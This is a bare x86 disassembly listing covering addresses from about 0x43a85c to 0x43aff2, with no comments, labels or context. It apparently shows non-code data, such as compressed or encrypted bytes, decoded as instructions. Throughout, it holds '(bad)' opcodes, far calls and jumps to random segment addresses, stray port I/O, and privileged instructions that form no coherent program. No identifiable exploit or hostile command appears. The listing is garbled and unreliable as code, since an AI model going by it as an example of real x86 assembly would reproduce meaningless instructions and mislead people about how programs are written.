  43a85c:	add    BYTE PTR [ebx-0x5c9577bf],al
  43a862:	adc    DWORD PTR [esi+0x5b31f8b2],0x54
  43a869:	out    dx,al
  43a86a:	and    al,0x1
  43a86c:	outs   dx,DWORD PTR ds:[esi]
  43a86d:	or     esi,DWORD PTR [ebx-0x7a]
  43a870:	pop    esp
  43a871:	retf   0x9c4b
  43a874:	adc    BYTE PTR [edi+0x6b11179a],cl
  43a87a:	stc    
  43a87b:	aas    
  43a87c:	aam    0x1c
  43a87e:	and    BYTE PTR [eax-0x6dfccdba],ah
  43a884:	jb     0x43a881
  43a886:	cwde   
  43a887:	fs adc al,0x8
  43a88a:	call   0xf31:0xfa74e533
  43a891:	(bad)  
  43a892:	push   ss
  43a893:	jmp    0x43a8ba
  43a895:	cmp    al,0x85
  43a897:	outs   dx,DWORD PTR ds:[esi]
  43a898:	cmc    
  43a899:	retf   
  43a89a:	iret   
  43a89b:	mov    ch,0x10
  43a89d:	jle    0x43a824
  43a89f:	scas   al,BYTE PTR es:[edi]
  43a8a0:	mov    bl,0x96
  43a8a2:	test   al,0x21
  43a8a4:	xchg   ebx,eax
  43a8a5:	jne    0x43a828
  43a8a7:	jg     0x43a83b
  43a8a9:	popf   
  43a8aa:	je     0x43a853
  43a8ac:	fidiv  DWORD PTR [edi]
  43a8ae:	inc    ebx
  43a8af:	bound  esp,QWORD PTR [edi-0x61c2f54e]
  43a8b5:	xor    DWORD PTR [edx+0x2d],esp
  43a8b8:	mov    dl,0x8e
  43a8ba:	int3   
  43a8bb:	xor    bh,BYTE PTR fs:[ebx-0x5d5a14d1]
  43a8c2:	call   0x414:0x8ba26851
  43a8c9:	neg    DWORD PTR [edx+0x519e119d]
  43a8cf:	stos   DWORD PTR es:[edi],eax
  43a8d0:	jb     0x43a911
  43a8d2:	loope  0x43a87b
  43a8d4:	int    0x2d
  43a8d6:	xchg   DWORD PTR [edx+0x7],edi
  43a8d9:	or     ecx,ecx
  43a8db:	mov    ah,0xb1
  43a8dd:	xor    al,0xf3
  43a8df:	retf   0xf9d2
  43a8e2:	mov    ds:0x2b2c1220,al
  43a8e7:	jne    0x43a8e0
  43a8e9:	and    al,0x69
  43a8eb:	adc    eax,0x8e9a0e6c
  43a8f0:	test   ebx,esi
  43a8f2:	or     dh,BYTE PTR [ecx-0x74]
  43a8f5:	or     esi,DWORD PTR [edi]
  43a8f7:	inc    esp
  43a8f8:	push   cs
  43a8f9:	mov    BYTE PTR [ecx],dl
  43a8fb:	jne    0x43a909
  43a8fd:	cmp    eax,DWORD PTR [esi+0x7c56a7a]
  43a903:	shl    DWORD PTR [ebx],1
  43a905:	xchg   BYTE PTR ds:0x56de16c1,dh
  43a90b:	xchg   ebp,eax
  43a90c:	add    DWORD PTR [ebx+0x7d],edi
  43a90f:	mov    al,ds:0xb4c64112
  43a914:	in     eax,dx
  43a915:	retf   
  43a916:	inc    esi
  43a917:	and    al,0x23
  43a919:	and    eax,0xe3f54bb6
  43a91e:	call   0xe90c:0x4b9357de
  43a925:	or     bl,BYTE PTR [ecx-0x4d86b908]
  43a92b:	xchg   ecx,eax
  43a92c:	jge    0x43a921
  43a92e:	sub    al,0x36
  43a930:	mov    dl,0x7b
  43a932:	add    ecx,edi
  43a934:	dec    esp
  43a935:	add    al,0xd6
  43a937:	jl     0x43a95a
  43a939:	or     ebp,DWORD PTR [esi-0x22]
  43a93c:	aad    0x7d
  43a93e:	push   eax
  43a93f:	or     DWORD PTR [eax+esi*4],edi
  43a942:	call   0x4e8c:0xb47e0fa2
  43a949:	dec    edi
  43a94a:	popf   
  43a94b:	pushf  
  43a94c:	(bad)  
  43a94d:	or     bl,BYTE PTR [edx]
  43a94f:	in     al,dx
  43a950:	arpl   WORD PTR [eax*8-0x65a7bee2],bx
  43a957:	jp     0x43a92a
  43a959:	xchg   ecx,eax
  43a95a:	mov    gs,WORD PTR [edi-0x57a432d5]
  43a960:	(bad)  
  43a961:	push   ecx
  43a962:	test   eax,0x755ef2e7
  43a967:	mov    ds:0x68947e1c,al
  43a96c:	pop    edi
  43a96d:	(bad)  
  43a96e:	scas   eax,DWORD PTR es:[edi]
  43a96f:	xchg   DWORD PTR ds:0x64b088fd,esi
  43a975:	jne    0x43a9dd
  43a977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a978:	sub    ecx,DWORD PTR [esi-0x57511b92]
  43a97e:	push   esi
  43a97f:	loop   0x43a933
  43a981:	mov    ecx,0x6b78c1f7
  43a986:	mov    DWORD PTR [esi-0x4fc9f4a7],edx
  43a98c:	ret    0xb2ca
  43a98f:	std    
  43a990:	xlat   BYTE PTR ds:[ebx]
  43a991:	into   
  43a992:	jmp    0x200356f5
  43a997:	adc    eax,0x708e3732
  43a99c:	mov    ebp,0xe5a72d2f
  43a9a1:	mov    eax,ds:0x7aae8734
  43a9a6:	cmp    al,bh
  43a9a8:	mov    dl,0xeb
  43a9aa:	add    BYTE PTR [edx],dh
  43a9ac:	or     DWORD PTR [ebx+0x47],edi
  43a9af:	sahf   
  43a9b0:	cs or  edx,ecx
  43a9b3:	and    DWORD PTR [ecx],ebx
  43a9b5:	adc    eax,0x76bf0181
  43a9ba:	loope  0x43a9ba
  43a9bc:	mov    dl,0x96
  43a9be:	ins    BYTE PTR es:[edi],dx
  43a9bf:	lds    edi,FWORD PTR [ebx+eiz*8]
  43a9c2:	sar    BYTE PTR [eax-0x36],0xb
  43a9c6:	std    
  43a9c7:	mov    eax,ds:0xd7c6d6da
  43a9cc:	mov    ebp,0x59779abd
  43a9d1:	(bad)  
  43a9d2:	out    0xb5,al
  43a9d4:	mov    esp,0xd4a81594
  43a9d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a9da:	fwait
  43a9db:	jmp    0x43a98f
  43a9dd:	cmp    al,0x58
  43a9df:	jl     0x43a9ee
  43a9e1:	push   eax
  43a9e2:	mov    dl,0x93
  43a9e4:	push   esi
  43a9e5:	(bad)  
  43a9e6:	call   0x401a:0xfd9f9978
  43a9ed:	mov    bh,0xc4
  43a9ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a9f0:	(bad)  
  43a9f2:	cmp    BYTE PTR [ebx-0x474cfd68],al
  43a9f8:	add    dh,BYTE PTR [ebp-0x90b1266]
  43a9fe:	sbb    al,0x2
  43aa00:	dec    ebp
  43aa01:	push   ss
  43aa02:	sbb    esp,DWORD PTR [edi-0x7d496227]
  43aa08:	fs je  0x43aa2b
  43aa0b:	ds mov dl,0x94
  43aa0e:	(bad)  
  43aa0f:	jmp    0xf7e5:0xf5212dfd
  43aa16:	sub    eax,0xfc0402a6
  43aa1b:	sbb    DWORD PTR [ebx+0x5b4ff2f1],ecx
  43aa21:	xchg   ebx,eax
  43aa22:	call   0xefb0:0xba2ac21d
  43aa29:	out    dx,al
  43aa2a:	sub    BYTE PTR [edi-0x62c4d613],ah
  43aa30:	mov    ds:0xb2043207,al
  43aa35:	add    al,0x43
  43aa37:	mov    ah,0xd7
  43aa39:	das    
  43aa3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aa3b:	repz pop ss
  43aa3d:	or     esi,eax
  43aa3f:	test   eax,0x73b5e90d
  43aa44:	scas   eax,DWORD PTR es:[edi]
  43aa45:	pop    ebx
  43aa46:	call   0x91fe5d11
  43aa4b:	xchg   esp,eax
  43aa4c:	pop    eax
  43aa4d:	out    0x5f,eax
  43aa4f:	or     al,0x93
  43aa51:	or     eax,DWORD PTR [esi]
  43aa53:	mov    eax,0xcd28d2cd
  43aa58:	pmuludq mm1,mm2
  43aa5b:	imul   ebx,DWORD PTR [edx],0x38
  43aa5e:	call   0xacd0:0xf2bb03af
  43aa65:	ror    dh,1
  43aa67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aa68:	arpl   WORD PTR [ebx-0x9bc22c2],dx
  43aa6e:	or     DWORD PTR [ebp-0x6b9e024e],esp
  43aa74:	(bad)  
  43aa75:	(bad)  
  43aa76:	jmp    0x30a4:0x5dff5b68
  43aa7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aa7e:	xor    bh,BYTE PTR [ebx+ebx*1]
  43aa81:	push   edx
  43aa82:	xor    DWORD PTR [edi+0x5d],esi
  43aa85:	pop    ebx
  43aa86:	adc    BYTE PTR [edi+0x14],bl
  43aa89:	lahf   
  43aa8a:	call   0xecb9:0xd645a28c
  43aa91:	in     eax,dx
  43aa92:	jp     0x43aa3b
  43aa94:	(bad)  
  43aa96:	or     BYTE PTR [di-0x26],dh
  43aa9a:	mov    BYTE PTR [edx+esi*4],al
  43aa9d:	push   0x3cb788be
  43aaa2:	adc    edx,ebp
  43aaa4:	and    BYTE PTR [esi+eiz*1],dh
  43aaa7:	dec    edi
  43aaa8:	mov    dl,0xd4
  43aaaa:	mov    cl,BYTE PTR [ecx+0x64e63586]
  43aab0:	mov    dl,0xc7
  43aab2:	xor    bh,BYTE PTR [edx-0x47]
  43aab5:	clc    
  43aab6:	sbb    cl,BYTE PTR [ecx+0x62]
  43aab9:	or     edi,DWORD PTR [edi+0x31667dea]
  43aabf:	add    DWORD PTR [ebp+0x4e],ecx
  43aac2:	call   0x3bb4:0x1bcb3fc1
  43aac9:	js     0x43aab0
  43aacb:	mov    al,ds:0x9ed69f15
  43aad0:	pushf  
  43aad1:	jnp    0x43aaa2
  43aad3:	jmp    0xd6ca6dbe
  43aad8:	mov    ds:0x3b601a8f,al
  43aadd:	sub    al,0x93
  43aadf:	cmc    
  43aae0:	or     ecx,DWORD PTR [si+0x14]
  43aae4:	arpl   si,ax
  43aae6:	je     0x43ab39
  43aae8:	sub    dh,dl
  43aaea:	cmp    bl,BYTE PTR [esi]
  43aaec:	mov    esp,0xcef26ce9
  43aaf1:	xor    al,0x9a
  43aaf3:	retf   0x7242
  43aaf6:	jbe    0x43ab5b
  43aaf8:	in     eax,dx
  43aaf9:	cmp    al,0xa7
  43aafb:	test   al,0xef
  43aafd:	dec    ecx
  43aafe:	icebp  
  43aaff:	jnp    0x43ab73
  43ab01:	mov    bl,0xe5
  43ab03:	imul   eax,DWORD PTR [ebx],0xffffff9a
  43ab06:	mov    ch,0xb8
  43ab09:	or     esi,DWORD PTR [edi]
  43ab0b:	mov    bh,0xdb
  43ab0d:	jae    0x43aad8
  43ab0f:	mov    DWORD PTR [edi+0xd9431f1],edi
  43ab15:	pop    es
  43ab16:	cmp    BYTE PTR [edi],0x12
  43ab19:	jmp    0xd7e9:0x59b24bc3
  43ab20:	and    DWORD PTR [eax+0xa727417],ecx
  43ab26:	mov    eax,0x84a9f0b8
  43ab2b:	packuswb mm4,mm3
  43ab2e:	cld    
  43ab2f:	fs mov dl,0xef
  43ab32:	or     eax,0xb2c273d3
  43ab37:	stos   DWORD PTR es:[edi],eax
  43ab38:	sub    BYTE PTR [ebx],cl
  43ab3a:	sbb    al,0xa8
  43ab3c:	add    DWORD PTR [ecx-0x4f],esp
  43ab3f:	sahf   
  43ab40:	pop    edx
  43ab41:	and    BYTE PTR [edx+0x338be3ed],0x9f
  43ab48:	gs pop ebp
  43ab4a:	mov    ecx,0xa40b6935
  43ab4f:	es mov ch,0xe8
  43ab52:	fild   WORD PTR [edx+ecx*2]
  43ab55:	and    al,0x9a
  43ab57:	jmp    0x5ebfa480
  43ab5c:	call   0x1cc6:0x9ba7b9e3
  43ab63:	push   ecx
  43ab64:	aas    
  43ab65:	fidivr WORD PTR [eax+esi*4]
  43ab68:	mov    dl,0xba
  43ab6a:	repz arpl WORD PTR [edi+0x55],ax
  43ab6e:	in     al,0x6f
  43ab70:	mov    dh,0xc8
  43ab72:	pop    esi
  43ab73:	jg     0x43aaff
  43ab75:	jnp    0x43ab99
  43ab77:	pusha  
  43ab78:	out    dx,eax
  43ab79:	push   ecx
  43ab7a:	call   0x75a:0x780a3efb
  43ab81:	mov    ebx,esi
  43ab83:	ror    dh,1
  43ab85:	retf   0xb25c
  43ab88:	mov    ds:0xd06762d9,eax
  43ab8d:	dec    esp
  43ab8e:	mov    esi,0x9aa47552
  43ab93:	arpl   WORD PTR [ecx],cx
  43ab95:	inc    edx
  43ab96:	repnz cld 
  43ab98:	lods   al,BYTE PTR ds:[esi]
  43ab99:	push   ss
  43ab9a:	jecxz  0x43ab85
  43ab9c:	or     DWORD PTR [edx],0xffffff82
  43ab9f:	add    al,BYTE PTR [edx-0x3c983fb8]
  43aba5:	leave  
  43aba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aba7:	push   esp
  43aba8:	outs   dx,BYTE PTR ds:[esi]
  43aba9:	or     al,0xac
  43abab:	bound  edx,QWORD PTR [esi+eiz*4]
  43abae:	jp     0x43ac13
  43abb0:	retf   0x555c
  43abb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43abb4:	out    0x91,al
  43abb6:	mov    ebp,0x19c33d0f
  43abbb:	loope  0x43ab6f
  43abbd:	xor    al,0xf5
  43abbf:	push   0x53
  43abc1:	pop    edx
  43abc2:	add    eax,DWORD PTR [edx]
  43abc4:	retf   
  43abc5:	or     al,0x5a
  43abc7:	rcr    BYTE PTR [ebx+0x23778582],cl
  43abcd:	clc    
  43abce:	repz mov ebp,0x23a357b2
  43abd4:	xchg   BYTE PTR [edx-0x55],bl
  43abd7:	sar    ebx,0xf7
  43abda:	inc    edx
  43abdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43abdc:	scas   eax,DWORD PTR es:[edi]
  43abdd:	mov    bh,0x57
  43abdf:	push   ebx
  43abe0:	or     BYTE PTR [edx-0x7b4e6e67],dh
  43abe6:	adc    esp,edx
  43abe8:	cli    
  43abe9:	and    eax,0xcc3817c9
  43abee:	mov    BYTE PTR [esp+eiz*8+0x42ddb8ae],ah
  43abf5:	xchg   ecx,eax
  43abf6:	sbb    ch,BYTE PTR [ebx-0x79]
  43abf9:	fstp   QWORD PTR [edx+0x37dfed09]
  43abff:	xor    DWORD PTR [esi],ecx
  43ac01:	sub    al,0x4b
  43ac03:	mov    eax,0x274a75ab
  43ac08:	sub    esi,DWORD PTR [edx]
  43ac0a:	ror    DWORD PTR ss:[ecx+0x73],1
  43ac0e:	call   0x6769:0x3d9f5c32
  43ac15:	xchg   DWORD PTR [edx],ebp
  43ac17:	test   eax,0xfe6ab5e9
  43ac1c:	sar    BYTE PTR ds:0x57642f45,cl
  43ac22:	call   0xe556:0xf235cc5d
  43ac29:	shl    BYTE PTR [eax],0xd9
  43ac2c:	je     0x43ac3c
  43ac2e:	pop    edx
  43ac2f:	pop    esp
  43ac30:	data16 mov al,ds:0xcb17b9c7
  43ac36:	mov    al,0x6e
  43ac38:	and    dl,ah
  43ac3a:	xchg   ah,bl
  43ac3c:	mov    al,ds:0xb231ae34
  43ac41:	pop    edi
  43ac42:	inc    ebx
  43ac43:	test   al,0x45
  43ac45:	data16 mov al,ds:0x6da09d83
  43ac4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ac4c:	out    dx,al
  43ac4d:	pop    es
  43ac4e:	inc    edi
  43ac4f:	into   
  43ac50:	jne    0x43abef
  43ac52:	mov    dl,0xa6
  43ac54:	gs std 
  43ac56:	call   0xd09e:0x79f5a693
  43ac5d:	jge    0x43ac50
  43ac5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ac60:	test   eax,0x44e5d3e7
  43ac65:	mov    edi,0xf9b3f403
  43ac6a:	add    eax,0x16072c5e
  43ac6f:	dec    ecx
  43ac70:	bound  ebx,QWORD PTR [ebp-0x58b058bc]
  43ac76:	pop    ds
  43ac77:	jbe    0x43aca4
  43ac79:	xlat   BYTE PTR ds:[ebx]
  43ac7a:	push   ebp
  43ac7b:	das    
  43ac7c:	mov    dl,0x15
  43ac7e:	cdq    
  43ac7f:	and    al,0xd9
  43ac81:	in     al,dx
  43ac82:	fs in  al,dx
  43ac84:	or     edi,DWORD PTR [ebx-0x29dc58bd]
  43ac8a:	out    0x85,al
  43ac8c:	test   cl,al
  43ac8e:	push   esp
  43ac8f:	cmp    ebp,DWORD PTR [esi+0x7c5f73f4]
  43ac95:	push   ebp
  43ac96:	mov    DWORD PTR [edi-0x5335c7c7],esp
  43ac9c:	dec    esi
  43ac9d:	jnp    0x43ac20
  43ac9f:	mov    DWORD PTR [ebx],edx
  43aca1:	cmp    BYTE PTR [edi+eiz*4+0x752c7b98],0x22
  43aca9:	sbb    eax,0x370a8284
  43acae:	call   0x61ec:0x146c98e
  43acb5:	std    
  43acb6:	cmp    esp,DWORD PTR [edi-0x4788cab2]
  43acbc:	cmc    
  43acbd:	stos   DWORD PTR es:[edi],eax
  43acbe:	sbb    al,0x79
  43acc0:	mov    dl,0xb6
  43acc2:	pop    ds
  43acc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43acc4:	pusha  
  43acc5:	scas   eax,DWORD PTR es:[edi]
  43acc6:	inc    ebp
  43acc7:	xor    eax,0x66300455
  43accc:	mov    ecx,0x896d3aa0
  43acd1:	outs   dx,BYTE PTR ds:[esi]
  43acd2:	les    edx,FWORD PTR [ecx-0x6197564e]
  43acd8:	inc    ebp
  43acd9:	ret    0x6367
  43acdc:	or     DWORD PTR [ebx],0xcc4316a2
  43ace2:	push   cs
  43ace3:	les    esi,FWORD PTR [edi-0x41e6583]
  43ace9:	dec    esp
  43acea:	jae    0x43ad40
  43acec:	xchg   esp,eax
  43aced:	test   BYTE PTR es:[edi-0x595f2859],dl
  43acf4:	loope  0x43ad68
  43acf6:	call   0x6f31:0x23e1325b
  43acfd:	and    cl,dh
  43acff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ad00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ad01:	sub    eax,0x96869e94
  43ad06:	inc    esi
  43ad07:	lock mov al,ds:0xb2cc0ab3
  43ad0d:	fild   DWORD PTR ds:[edi-0x58a793a0]
  43ad14:	sar    DWORD PTR [ecx+edi*2],0x46
  43ad18:	call   0xb2e16f2e
  43ad1d:	mov    ds,WORD PTR [esi-0x74e706e]
  43ad23:	sub    al,0x9d
  43ad25:	add    al,0x3a
  43ad27:	lods   eax,DWORD PTR ds:[esi]
  43ad28:	bound  esp,QWORD PTR gs:[esi]
  43ad2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ad2c:	(bad)  
  43ad2d:	in     eax,dx
  43ad2e:	xchg   esp,eax
  43ad2f:	pop    edi
  43ad30:	or     esi,DWORD PTR [ebx+0x13de699a]
  43ad36:	adc    DWORD PTR [esi-0x7c60bc24],edx
  43ad3c:	repz into 
  43ad3e:	add    eax,0xa36647a7
  43ad43:	pop    ss
  43ad44:	(bad)  
  43ad45:	aaa    
  43ad46:	fwait
  43ad47:	icebp  
  43ad48:	into   
  43ad49:	mov    ?,WORD PTR [edx+0x76c6e11a]
  43ad4f:	lahf   
  43ad50:	stc    
  43ad51:	or     al,0x18
  43ad53:	sub    esi,edx
  43ad55:	ins    BYTE PTR es:[edi],dx
  43ad56:	xchg   esp,eax
  43ad57:	adc    BYTE PTR [ebx],bh
  43ad59:	sbb    edx,DWORD PTR [esi+0x0]
  43ad5c:	jo     0x43addd
  43ad5e:	xchg   ebx,eax
  43ad5f:	js     0x43ad9f
  43ad61:	(bad)  
  43ad62:	test   BYTE PTR [edi+0x7b4f1ffd],ah
  43ad68:	pushf  
  43ad69:	or     ebx,esi
  43ad6b:	add    bl,BYTE PTR [edx-0x13]
  43ad6e:	mov    ebx,0x9a0685ed
  43ad73:	stc    
  43ad74:	(bad)  
  43ad75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ad76:	jnp    0x43ad31
  43ad78:	xor    al,0x35
  43ad7a:	pop    esi
  43ad7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ad7c:	int3   
  43ad7d:	xor    ch,dl
  43ad7f:	add    eax,DWORD PTR [ebx]
  43ad81:	push   edi
  43ad82:	pop    edx
  43ad83:	sub    BYTE PTR [eax-0x44],dl
  43ad86:	call   0x1198:0x408ff774
  43ad8d:	test   edi,esi
  43ad8f:	fld    st(0)
  43ad91:	jl     0x43ad91
  43ad93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ad94:	jno    0x43addf
  43ad96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ad97:	adc    edx,0x4c006f6c
  43ad9d:	sub    dl,BYTE PTR [ebx-0x78a478de]
  43ada3:	daa    
  43ada4:	imul   esp,DWORD PTR [edx-0x453dbb1],0x27
  43adab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43adac:	mov    al,ds:0x9e447b4d
  43adb1:	lds    ecx,FWORD PTR [ebx]
  43adb3:	std    
  43adb4:	mov    BYTE PTR [ebp+0x16],dl
  43adb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43adb8:	xchg   esp,eax
  43adb9:	shr    eax,0xb
  43adbc:	imul   ecx,DWORD PTR [ebx+0x150ca878],0x8b3ce76f
  43adc6:	int    0xb6
  43adc8:	fnstcw WORD PTR [ecx-0x184dce82]
  43adce:	aas    
  43adcf:	aaa    
  43add0:	dec    ecx
  43add1:	jmp    0x97fb:0xb16b2eb
  43add8:	xchg   DWORD PTR [edi+eax*2],ebp
  43addb:	xchg   ebx,eax
  43addc:	inc    ebp
  43addd:	sub    ebx,DWORD PTR [ebp-0x271c3aef]
  43ade3:	mov    bh,0x12
  43ade5:	or     al,BYTE PTR [eax]
  43ade7:	or     dh,ah
  43ade9:	or     eax,DWORD PTR [ecx+0x5b]
  43adec:	pop    ebx
  43aded:	push   ebp
  43adee:	loopne 0x43adef
  43adf0:	cld    
  43adf1:	fdiv   QWORD PTR [eax+0x2e]
  43adf4:	mov    dl,0xf8
  43adf6:	push   esi
  43adf7:	jno    0x43adad
  43adf9:	mov    dl,BYTE PTR ds:0x4f0b5ebb
  43adff:	push   cs
  43ae00:	xor    al,0x8b
  43ae02:	(bad)  
  43ae03:	(bad)  
  43ae05:	ja     0x43ada1
  43ae07:	dec    ecx
  43ae08:	inc    ebx
  43ae09:	and    esp,eax
  43ae0b:	iret   
  43ae0c:	pop    esi
  43ae0e:	fsub   QWORD PTR [edi+0x47061d12]
  43ae14:	xor    ebx,edx
  43ae16:	ins    BYTE PTR es:[edi],dx
  43ae17:	out    dx,al
  43ae18:	mov    dl,0xa5
  43ae1a:	jae    0x43ae9b
  43ae1c:	jne    0x43ae26
  43ae1e:	sti    
  43ae1f:	xor    bl,ch
  43ae21:	add    al,0x0
  43ae23:	adc    al,0x87
  43ae25:	hlt    
  43ae26:	mov    edx,0x13857288
  43ae2b:	sbb    bl,BYTE PTR [edx+0x6]
  43ae2e:	jecxz  0x43ae02
  43ae30:	mov    dl,0x61
  43ae32:	adc    BYTE PTR [esi],bh
  43ae34:	fprem1 
  43ae36:	cmp    BYTE PTR [ebx+0x73],ch
  43ae39:	or     ecx,DWORD PTR [edi]
  43ae3b:	pop    ds
  43ae3c:	xor    eax,0xbadb083
  43ae41:	rcr    DWORD PTR [edx-0x1b494f29],cl
  43ae47:	(bad)  
  43ae48:	out    dx,al
  43ae49:	bound  eax,QWORD PTR [edi+eiz*4]
  43ae4c:	dec    esi
  43ae4d:	stos   DWORD PTR es:[edi],eax
  43ae4e:	jl     0x43adf8
  43ae50:	xor    ch,BYTE PTR [ebp+0x39]
  43ae53:	dec    eax
  43ae55:	pop    es
  43ae56:	test   dl,dh
  43ae58:	pop    ss
  43ae59:	cmp    al,0xda
  43ae5b:	out    dx,al
  43ae5c:	pop    es
  43ae5d:	(bad)  
  43ae5f:	fnstsw WORD PTR [edi]
  43ae61:	or     ebp,esp
  43ae63:	jl     0x43ae6f
  43ae65:	and    BYTE PTR [ebx],0x34
  43ae68:	cmp    esi,esi
  43ae6a:	xchg   ax,ax
  43ae6c:	jmp    0xe494:0x11a0346a
  43ae73:	push   es
  43ae74:	ret    0xc961
  43ae77:	adc    DWORD PTR [ecx+0xb],0x4acb508c
  43ae7e:	pop    ebx
  43ae7f:	mov    esi,0xf3b4044d
  43ae84:	lds    eax,FWORD PTR [edi-0x65]
  43ae87:	in     al,dx
  43ae88:	push   ebx
  43ae89:	xchg   edi,eax
  43ae8a:	lods   al,BYTE PTR ds:[esi]
  43ae8b:	add    BYTE PTR [esi-0x4d],cl
  43ae8e:	adc    esp,DWORD PTR [edi+0x55b30032]
  43ae94:	dec    ebx
  43ae95:	in     eax,dx
  43ae96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ae97:	in     al,0xb2
  43ae99:	xchg   esi,eax
  43ae9a:	fdivr  QWORD PTR [edx+0x31ee5d0]
  43aea0:	cmc    
  43aea1:	add    al,0x90
  43aea3:	or     DWORD PTR [esi-0x60],ecx
  43aea6:	mov    cl,0x30
  43aea8:	xor    ah,BYTE PTR [ebp+0x72]
  43aeab:	jle    0x43ae4f
  43aead:	pop    ebp
  43aeae:	call   0xa196:0xf2cd82d1
  43aeb5:	lahf   
  43aeb6:	dec    edi
  43aeb7:	(bad)  
  43aeb9:	xor    al,0xe8
  43aebb:	xchg   ebp,eax
  43aebc:	xor    dl,BYTE PTR [ecx+0x64]
  43aebf:	retf   
  43aec0:	inc    ecx
  43aec1:	dec    ecx
  43aec2:	xor    DWORD PTR [edx+esi*4],eax
  43aec5:	cmp    ah,BYTE PTR [ebp+0x54f07e75]
  43aecb:	sbb    al,0x52
  43aecd:	or     eax,DWORD PTR [esi+0x29]
  43aed0:	loope  0x43aed6
  43aed2:	gs std 
  43aed4:	dec    eax
  43aed5:	cld    
  43aed6:	popf   
  43aed7:	sar    edx,0xf
  43aeda:	jmp    0x4cba42bf
  43aedf:	inc    ecx
  43aee0:	push   0xffffff95
  43aee2:	inc    edx
  43aee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aee4:	gs out dx,al
  43aee6:	or     ah,BYTE PTR [edx]
  43aee8:	sub    BYTE PTR [edi-0x1078e3ed],0x12
  43aeef:	xchg   BYTE PTR [edx+0x34cf4432],dh
  43aef5:	clc    
  43aef6:	(bad)  
  43aef7:	sub    ebx,esi
  43aef9:	or     esi,DWORD PTR [ebx*8-0x4584ec6b]
  43af00:	(bad)
  43af03:	pop    ecx
  43af04:	mov    ch,0x8b
  43af06:	test   al,0xb3
  43af08:	dec    edx
  43af09:	aaa    
  43af0a:	je     0x43aec3
  43af0c:	dec    ebx
  43af0d:	add    eax,0xa847b4be
  43af12:	call   0x6d95:0xb72c143b
  43af19:	outs   dx,DWORD PTR ds:[esi]
  43af1a:	call   0xc3ff:0xea6b9c22
  43af21:	or     esi,DWORD PTR [esi+0x26]
  43af24:	rcl    ebp,cl
  43af26:	pop    ebp
  43af27:	addr16 out 0x1d,al
  43af2a:	call   0xbd44:0xb706e50d
  43af31:	enter  0xa294,0x52
  43af35:	aaa    
  43af36:	jae    0x43aec3
  43af38:	outs   dx,BYTE PTR ds:[esi]
  43af39:	retf   
  43af3a:	mov    BYTE PTR [eax+edx*4-0x35],cl
  43af3e:	outs   dx,BYTE PTR ds:[esi]
  43af3f:	bound  edx,QWORD PTR [edx+0x8]
  43af42:	call   0x1559:0xecb7aa19
  43af49:	xor    dl,BYTE PTR [edx+0x7cec34a9]
  43af4f:	jle    0x43af03
  43af51:	pusha  
  43af52:	add    esi,DWORD PTR [edx]
  43af54:	push   esi
  43af55:	adc    al,0x95
  43af57:	rcl    BYTE PTR [edi],0x42
  43af5a:	inc    edi
  43af5b:	add    ah,ah
  43af5d:	mov    ebx,0xe737fb39
  43af62:	pop    edx
  43af63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43af64:	mov    esi,DWORD PTR [eax-0x68]
  43af67:	sti    
  43af68:	not    BYTE PTR [ebp-0x66]
  43af6b:	(bad)  
  43af6d:	mov    eax,fs:0xbca262b4
  43af73:	xchg   esi,eax
  43af74:	das    
  43af75:	daa    
  43af76:	call   0x461a:0xe4ba046c
  43af7d:	or     al,0xb4
  43af7f:	jmp    0xc9d:0x67f63ca7
  43af86:	sub    eax,0xd673b257
  43af8b:	dec    ebp
  43af8c:	imul   ecx,DWORD PTR [edi-0x33],0x6c1337d3
  43af93:	es cmc 
  43af95:	pop    edi
  43af96:	mov    eax,ds:0x90069e18
  43af9b:	xor    BYTE PTR [edx+0x18bb9a09],bl
  43afa1:	push   ds
  43afa2:	add    DWORD PTR [edi-0x57181abe],0xd9229281
  43afac:	xchg   edx,eax
  43afad:	pusha  
  43afae:	ror    BYTE PTR [esi-0x28],1
  43afb1:	outs   dx,BYTE PTR ds:[esi]
  43afb2:	sahf   
  43afb3:	jns    0x43afe6
  43afb5:	fist   WORD PTR [ecx+0x13ba3245]
  43afbb:	add    DWORD PTR [eax+0xb],ecx
  43afbe:	dec    ecx
  43afbf:	push   edx
  43afc0:	pop    esi
  43afc1:	mov    BYTE PTR [ebx+ebp*2],0xa2
  43afc5:	push   ds
  43afc6:	call   0xa999:0xa3ce54bb
  43afcd:	mov    eax,0xe365dd48
  43afd2:	push   edx
  43afd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43afd4:	test   BYTE PTR [ebx+0x4857b806],0x3
  43afdb:	mov    edi,0xad5622b2
  43afe0:	test   BYTE PTR [ecx+esi*4],al
  43afe3:	inc    edi
  43afe4:	push   ebp
  43afe5:	jne    0x43afbf
  43afe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43afe8:	loopne 0x43af79
  43afea:	pop    ds
  43afeb:	in     eax,dx
  43afec:	jns    0x43afde
  43afee:	pop    esp
  43afef:	sub    BYTE PTR [esi+0x72],al
  43aff2:	fwait
